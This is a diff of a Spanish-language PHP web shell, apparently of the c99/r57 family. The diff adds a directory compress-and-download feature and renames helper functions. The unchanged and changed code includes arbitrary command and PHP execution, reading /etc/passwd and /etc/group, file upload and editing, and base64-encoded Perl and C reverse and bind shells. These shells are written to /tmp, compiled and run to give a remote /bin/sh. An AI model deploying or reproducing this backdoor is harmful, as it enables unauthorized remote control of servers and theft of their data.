@@ -47,6 +47,9 @@
     [!] Si la version de php no esta afectada por el bug, no se muestra el checkbox para el exploit de ini_restore
     [+] Funcion para borrarse a si misma
     [-] w=creditos no está mas
+    [!] Cambió el icono para ejecutar comandos dentro de una carpeta
+    [+] Funcion para empaquetar y descargar directorios
+
   1.3.1
     [!] Modificado un bug que hacia que no se guarde la cookie con el estado del div lateral si no se ve el div de abajo
     [!] Cambié un par de comillas dobles que quedaban
@@ -69,8 +72,7 @@
     [+] Agregar comandos de la WSO, r57 y las variaciones de c99
     [+] Poner el css como las imagenes, en una peticion aparte y poner una version oscura
     [+] Agregar un reverse dns como el de US dentro de la shell
-    [+] Funcion para empaquetar y descargar directorios
-
+    [+] Comprimir directorios con ZipArchive
 */
 
 //Usuario (Dejalo vacio para que no pida clave):
@@ -190,7 +192,7 @@ if ($_GET['w']=='img'){
     }elseif($_GET['imagen']=='eliminar'){
         die(base64_decode('R0lGODlhEAAQAMQfAPMyMpfL/HSUseYTE/5WVrzd/e3x9eXs9VdwkarU+0pXbbba/ISqxaLQ+/74+MLg/Ym77PD1+v+IiNrf51Jhe0RNX/729rHX/CkxQz9GVsvM0f7IyNRBRuDo8P///////yH5BAEAAB8ALAAAAAAQABAAAAWSoOdYnlie5ac63OBt3MTMQu2p5TAQXhQdwAMEcSsRBoDSY1mIQIYigIsg8TCbPorHMqieHoXCYnGJaL9LsJicMJcYkfT6ckm0Fe84eFy3Nw54HgwGamwJDYgHFSUCBmGGiA0BHYsejXN+kpMZjBFifYgBogacHggTEQZBHawdBhoYjAizFBQKChUVGRkYZyi/wCEAOw=='));
     }elseif($_GET['imagen']=='comandos'){
-        die(base64_decode('R0lGODlhEAAQAMQfAHSUstdxbU1Zbvz9/4CwzVZtjeTs9Njq9+rx9o7B8d7LzbjTsISyhUiCRvb5/K7S5NXd36LQ+7TZ/PP2+sPh/ajL3ikxQz9HV+Hp8Jq/1czkt5PGeDhzKs9XUv///////yH5BAEAAB8ALAAAAAAQABAAAAWSoCeO5Pid3vE8VZYRBCADHvocBuKIgzcZiULN89D1Ap1AwDNAEISeyqDjQXau1M4AiriKlh7vFSK6DhrkMnWa1VIajLB3EWGb3wS5Z9GIOMRaDRsaIg8cDWwiGGYNcgoMbGkAUwMSenUdDhciAA4DlQciB3VNmx4FEBMIBqwYrhgIChacBbUFArgXuhcWAiW/vyEAOw=='));
+        die(base64_decode('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGNSURBVDjLpVM9SwNBEJ297J1FQBtzjQj2dgppYiP4A1KZRoiFrYWt9rHyH6QUPBDTCimtLNSAnSB26YKg4EdMdsd5611cjwsIWRhmZ3f2zZuPVcxMsyx9fPF0NRfS2vM7lx2WtcQiJHvDRvZMluXMGNHstJH7+Wj09jHkOy1+tc3VxeC+P6TXT1sYZX2hT7cvS6lepv3zHUp2T8vXNw81dXT2yGwEGeERSbSVCC5qysYa+3vm9sJGmLFojceXJ9uklCqUIAic5G3IytahAAhqqVSiwWDwx6nogW9XKhWphaGAvC50Oh1qtVr/7oAdCwBQwjB00mg0qFqtUr1ed3YURZM7X7TWTqM2Gm3CASRJEur1etTtdp1DnrafFtJGMbVNGSBas9l0DrAzR6x8DdwASUB0RqNNGS2/gH7EInvCwMhkZTnlnX0GsP09tJER0BgMoAEAa1rETDIQvBkjBZeHMIjjuNB5Ggg0/oZWPGrHGwd7Fp9F2CAlgHKqf0aYXb6Y2mzE8d/IfrXVrN/5G81p6oa2mIEUAAAAAElFTkSuQmCC'));
     }elseif($_GET['imagen']=='archivonuevo'){
         die(base64_decode('R0lGODlhEAAQANUoAOLp8ElVa0NLXIivyJXK/D5FVYm77N7n7ykxQ5rA1svM0YS8O4C4OJXJSInAP5fLS362N4/ERJLHR5DFRdXb5JbKStXn8HqzM4vAQJ7O+1Jhe1dwkezx9nKsLeXt9XaXtKTR+7HX/PL2+sDf/bvc/avU+7ba/P///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACgALAAAAAAQABAAAAaXwJNwSByijifLqdM5JQaDj/RzQgofjaFn6zFsqsuKJOJojs4ig1fYmWAWEDOJJKpriIzLcEQymUIid05LZnx+ISWBQgNEc3+IiQGLImd9fyUlICAekicfHJWXmSAZHgJCn46QmhkZAKeeHJaIrAQEBwWoIn2rrbYcuScbFCIcWwDIAAccCgioG9AaGgEBAgIFBQiCRdxEQQA7'));
     }elseif($_GET['imagen']=='carpetanueva'){
@@ -203,13 +205,18 @@ if ($_GET['w']=='img'){
         die(base64_decode('R0lGODlhEAAQAMQfAHaXtJLNW5fL/OTs9YivyMfj/tXb5Fdwkb3e/anT+0lVa/P2+dTn9Ovx9u32/mGNRIm77LXZ/H6xW1Jhe+Px/rTR4ENLXJrA1qjL3uDo7ykxQz5FVZ/P+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWaoCeO5PidHlNV2HURBCADHloxQ6M3Qz9Ah5qn0igYjYikAwIUYRbHQieJcDgWE9EFauxMEZEwVsvtBLxeRmLsIUAfkoD8TFkrRG4EXC6RdOoDdx4ADUkPAQ9oFBwDFiKESRGJFBQFHBwZjoOFYQkdlhwCAhkbjwtgEQmql6INpR4HBgs8Phm2DRUajwe8ExMKChbCGxpZJcclIQA7'));      
     }elseif($_GET['imagen']=='copiar'){
         die(base64_decode('R0lGODlhEAAQAMQfAHKQruzx9sfj/uXt9vL2+tXb5MHU4arT+7zd/YmwylVri5XK/IO76EhUaa/S5bPZ/Ha36VRie5/E2Ft6nt/o7ykxQ0FIVz1EVajL332hvNfn8HyjwI7B76HQ+////////yH5BAEAAB8ALAAAAAAQABAAAAWToCeO42een2c4jpRkAOChpudowxDk3FTWjoFAsGq9YrMUhiBg4XQ8X0rC5ASHAgSBw1CIEkzGEqslELwesIBBHSIQjwchItoEEAz1+3E4EBoiAHcQenwHHQOAHgAECBB2e4eIihMFBAaCcIcLCxQWgQoKEYyaHZwBFyQilQQ5FBQBBhVJNQChEQ0NFhcVdCiqwB4hADs='));      
+    }elseif($_GET['imagen']=='comprimir'){
+        die(base64_decode('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKQSURBVDjLbZNNaJxVFIafe7/5KTPzpUloNK0tIsowCtbiQgRRQReudCMVqYrdiLgQ01UrWUgXXZQumoU2myyKii66dOFCEUo3IiL+VRMFHactYpsMmsy0mbnnx8X8tEn7wuHAudyH97zcG9wdgKWl9zNgl7vvrVar51T1PndHVQHDzBCRFGNhqd1ePXb06PF1gALAhbONF+7PanPtymtP9G2iVK3WmJjYibtjZuNupsWVlYtviaRTwABw4WzjEPDRVGMy/vt3QLpCu73G2toqZoKZE2Mkz3PyfBKxgKplDFUA3rz7wL5Y2lnigdrHiDhuRlaoYJslrv3cWb7cfehka/3BxUY93+EGqolbAU/tqz+K2V/MzFQAHZYQ4146v55v/NPd81UxL6uKQgyY2RgQB025fOUPCC9COAjhJVqt38BlcKpKb/M65kbq9YfB3nQAGOVSxqXWCXDBSZTLBWAAMDOKsYibYURE0naAMjOzC5gc2Pc0vDwApJTQGx3UDJHNLQ7GK1xq/Q7hFQivQjzMn82LY4CqhiwWw8BBQNW2OxBK5Yxm812whNNnx5YVtBBkoxICkLqYbcugt9Fh9+xj4/RHtblxA7EMVZsOYZC+qqMqWwBHfvr829OjgRNIWkIsIhb54cr+r7Ms+3Bqanr0GjHzm4AnDy8vAAujwfz83NTs7O7z3W7nYTOjH3uPp7RuWZYNHdhtDrZIVda/8+fPWa06nfWvfjJxdfFTEd2zvPzLZyn1CCHSrx954/UPWi8DC2H0G2/VM8ebzeceqd375fer/9WvnTgDVET0oLsWzJDmPe/lzx64K//ix43WHQH1t1fmgLkC/TNPy8lFM4vuWhGx6G72TXX+UAqVd4DT/wMfm3vSJoP5ygAAAABJRU5ErkJggg=='));      
     }else{
         die();
     }
 // Esto es para descargar archivos. Va arriba porque no se puede mandar nada antes
-}elseif (( $_GET['w'] == 'descargar' ) and (( $archivo = leerarchivo($_REQUEST['ruta'] ))!==FALSE)){
+}elseif (( $_GET['w'] == 'descargar' ) and (( $archivo = leer_archivo($_REQUEST['ruta'] ))!==FALSE)){
     header('Content-type: application/force-download');
     header('Content-Disposition: attachment; filename="'.urlencode(basename($_REQUEST['ruta']))."\"\n");
+    if($_GET['borrar']){
+        unlink($_REQUEST['ruta']) or shell('rm -rf '.escapeshellarg($_REQUEST['ruta']));
+    }
     die($archivo);
 }
 
@@ -481,7 +488,7 @@ switch($_GET['w']){
         } 
         
         echo 'Ubicaci&oacute;n: '.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'<br>
-        Libre: '.htmlentities(decodeSize(disk_free_space($ruta)).' / '.decodeSize(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'<br>
+        Libre: '.htmlentities(decode_size(disk_free_space($ruta)).' / '.decode_size(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'<br>
         Safe_mode: '.$safemode.'<br>
         Funciones desactivadas: '.htmlentities(ini_get('disable_functions'), ENT_QUOTES, 'UTF-8').'<br>
         PHP: '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br>
@@ -495,7 +502,7 @@ switch($_GET['w']){
         Uname: '.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'<br>
         <br>
         ';
-        $usuarios = explode("\n",leerarchivo('/etc/passwd'));
+        $usuarios = explode("\n",leer_archivo('/etc/passwd'));
         
 /*Esta es la lista de cosas a mostrar
 Si empieza con > es un titulo
@@ -753,7 +760,7 @@ psybnc.conf
                 //mostramos el div y el textarea con el resultado
                 if ($resultado!=false){ echo '<div class="s">'.htmlentities(substr($comando,1), ENT_QUOTES, 'UTF-8').':</div><textarea style="width:100%;" rows="'.$lineas.'">'.htmlentities($resultado,ENT_QUOTES, 'UTF-8').'</textarea><br><br>'; } 
             }else{      //es un archivo, llamamos a la funcion que lo muestra en un textarea
-                mostrararchivo($comando);
+                mostrar_archivo($comando);
             }
         }
         
@@ -841,7 +848,7 @@ psybnc.conf
         }
         
         //el espacio libre y total en el hd
-        $espacio = '<div class="center" style="font-weight:bold;">'.decodeSize(disk_free_space($ruta)).' / '.decodeSize(disk_total_space($ruta)).'</div>';
+        $espacio = '<div class="center" style="font-weight:bold;">'.decode_size(disk_free_space($ruta)).' / '.decode_size(disk_total_space($ruta)).'</div>';
         
         //mostramos el formulario para cambiar de directorio
         echo '
@@ -890,7 +897,7 @@ psybnc.conf
             
             //mostramos el link a todos los archivos
             foreach($archivos as $archivo){
-                echo mostrarlink($ruta,$archivo);
+                echo mostrar_link($ruta,$archivo);
             }
             closedir($handledirectorios);
         }
@@ -922,7 +929,7 @@ psybnc.conf
             case 'Guardar':
                 if(($ruta!=='') and isset($ruta)){
                     $contenido = $_POST['contenido'];
-                    $resultado = escribirarchivo($ruta,$contenido);
+                    $resultado = escribir_archivo($ruta,$contenido);
                     if ($resultado===FALSE){
                         echo '<br><div class="n">Sin permisos de escritura o todas las funciones desactivadas</div>';
                     }
@@ -932,7 +939,7 @@ psybnc.conf
             //leemos el archivo
             case 'Abrir':
             default:
-                if ( file_exists($ruta) and (($archivo=leerarchivo($ruta))!==FALSE) ) {
+                if ( file_exists($ruta) and (($archivo=leer_archivo($ruta))!==FALSE) ) {
                     $perm = permisos($ruta);
                     //ponemos los colores de los permisos
                     if (is_writable($ruta)){
@@ -1040,7 +1047,7 @@ psybnc.conf
                     $subio = true;
                 }elseif(copy($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
                     $subio = true;
-                }elseif((($archivo=leerarchivo($HTTP_POST_FILES['ruta2']['tmp_name']))!==false) and (escribirarchivo($ruta.$HTTP_POST_FILES['ruta2']['name'],$archivo)!==false)){
+                }elseif((($archivo=leer_archivo($HTTP_POST_FILES['ruta2']['tmp_name']))!==false) and (escribir_archivo($ruta.$HTTP_POST_FILES['ruta2']['name'],$archivo)!==false)){
                     $subio = true;
                 }
             }
@@ -1102,7 +1109,7 @@ psybnc.conf
             
           
             //sacamos la lista de grupos y la mostramos
-            if($grupos = explode("\n",leerarchivo('/etc/group'))){
+            if($grupos = explode("\n",leer_archivo('/etc/group'))){
                 $listagrupos = '<select style="width:100%;" name="chgrp">'."\n";
                 foreach ($grupos as $grupo){
                     if ($nombregrupo = substr($grupo,0,strpos($grupo,':'))){
@@ -1119,7 +1126,7 @@ psybnc.conf
             }
             
             //sacamos la lista de usuarios y la mostramos
-            if($usuarios = explode("\n",leerarchivo('/etc/passwd'))){
+            if($usuarios = explode("\n",leer_archivo('/etc/passwd'))){
                 $listausuarios = '<select name="chown" style="width:100%;">'."\n";
                 foreach ($usuarios as $usuario){
                     if ($nombreusuario = substr($usuario,0,strpos($usuario,':'))){
@@ -1188,6 +1195,18 @@ psybnc.conf
                 echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($rutaOrigen),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
             }
         }
+    break;
+
+    /* Comprimir directorios */
+    case 'comprimir':
+        $ruta = realpath($_GET['ruta']);
+        if ( shell('tar czf ' . escapeshellarg('/tmp/'.basename($ruta).'.tar.gz') . ' '.escapeshellarg($ruta)) ){
+            //echo '<script>document.location=\''.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'\';</script>';
+            echo '<iframe src="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">';
+            echo '<a href="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">Descargar y borrar</a>';
+            echo '</iframe>';    
+        }
+        
     break;
 
     /* Enviar emails */
@@ -1290,7 +1309,7 @@ psybnc.conf
                     echo '<div class="n">No se pudo conectar</div>';
                 }
             }elseif($_POST['metodoinversa'] == 'perl'){
-		escribirarchivo('/tmp/bc.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvciIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3IiKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7'));
+		escribir_archivo('/tmp/bc.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvciIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3IiKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7'));
 		chmod('/tmp/bc.pl',0777);
                 $resultado = shell('perl /tmp/bc.pl '.$_POST['ip'].' '.$_POST['puertoinversa'].' 2>&1', false);
                 if (($resultado===false) or (substr($resultado,0,5)=='Error')){
@@ -1300,7 +1319,7 @@ psybnc.conf
                 }
                 unlink('/tmp/bc.pl');
             }elseif($_POST['metodoinversa'] == 'c'){
-		escribirarchivo('/tmp/bc.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0='));
+		escribir_archivo('/tmp/bc.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0='));
 		chmod('/tmp/bc.c',0777);
                 echo '<div class="n">'.shell('gcc -o /tmp/bc /tmp/bc.c 2>&1',false).'</div>';
                 unlink('/tmp/bc.c');
@@ -1315,7 +1334,7 @@ psybnc.conf
             }
         }elseif($_POST['accion']=='Escuchar'){
             if($_POST['metodoescuchar'] == 'perl'){
-		escribirarchivo('/tmp/bp.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJFcnJvciI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiRXJyb3IiOw0KbGlzdGVuKFMsMykgfHwgZGllIGRpZSAiRXJyb3IiOw0KYWNjZXB0KENPTk4sUyk7DQpvcGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwiPiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KY2xvc2UgQ09OTjsNCmV4aXQgMDs='));
+		escribir_archivo('/tmp/bp.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJFcnJvciI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiRXJyb3IiOw0KbGlzdGVuKFMsMykgfHwgZGllIGRpZSAiRXJyb3IiOw0KYWNjZXB0KENPTk4sUyk7DQpvcGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwiPiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KY2xvc2UgQ09OTjsNCmV4aXQgMDs='));
 		chmod('/tmp/bp.pl',0777);
                 $resultado = shell('perl /tmp/bp.pl '.$_POST['puertoescuchar'].'  2>&1', false);
                 if (($resultado===false) or (substr($resultado,0,5)=='Error')){
@@ -1324,7 +1343,7 @@ psybnc.conf
                     echo '<div class="s">Conectado</div>'; 
                 }
             }elseif($_POST['metodoescuchar'] == 'c'){
-                escribirarchivo('/tmp/bp.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=='));
+                escribir_archivo('/tmp/bp.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=='));
                 chmod('/tmp/bp.c',0777);
                 echo '<div class="n">'.shell('gcc -o /tmp/bp /tmp/bp.c 2>&1',false).'</div>';
                 unlink('/tmp/bp.c');
@@ -1520,17 +1539,17 @@ function shellpcntl($cmd){
 }
 
 //muestra los archivos del manejador de archivos
-function mostrarlink($ruta,$archivo,$eslink=FALSE){
+function mostrar_link($ruta,$archivo,$eslink=FALSE){
 global $rfiurl;
     if ($ruta){$barra='/';}else{$barra='';}
 
     //$celdaeditar es la primer columna
     if(is_link($ruta.$barra.$archivo)){         //Cuando son links
         $celdaeditar = '<td style="color:#CD2626;" class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
-        $salida = '<img src="'.$rfiurl.'w=img&imagen=enlace" class="ai" alt="Enlace"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a> <img src="'.$rfiurl.'w=img&imagen=flechad" class="ai" alt="enlaza a ">'.mostrarlink("",readlink($ruta.$barra.$archivo),TRUE);
+        $salida = '<img src="'.$rfiurl.'w=img&imagen=enlace" class="ai" alt="Enlace"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a> <img src="'.$rfiurl.'w=img&imagen=flechad" class="ai" alt="enlaza a ">'.mostrar_link("",readlink($ruta.$barra.$archivo),TRUE);
         
     }elseif (is_dir($ruta.$barra.$archivo)){        //Directorios
-        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=shell&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comandos" class="ai" alt="Ejecutar comandos"></a> <a href="'.$rfiurl.'w=php&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=php" class="ai" alt="Ejecutar PHP"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
